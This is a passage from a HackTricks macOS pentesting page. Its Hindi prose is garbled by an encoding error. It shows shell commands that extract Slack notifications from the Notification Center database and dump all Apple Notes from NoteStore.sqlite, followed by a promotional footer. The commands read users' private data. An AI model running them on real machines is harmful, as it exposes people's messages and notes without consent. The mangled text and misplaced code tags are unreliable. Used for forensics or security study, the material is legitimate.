рдЕрдзрд┐рдХрд╛рдВрд╢ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА **рдмреНрд▓реЙрдм** рдореЗрдВ рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдирд┐рдХрд╛рд▓рдиреЗ** рдФрд░ **рдорд╛рдирд╡-рдкрдардиреАрдп** рдмрдирд╛рдиреЗ рдпрд╛ **`strings`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### рдиреЛрдЯреНрд╕

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдиреЛрдЯреНрд╕** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
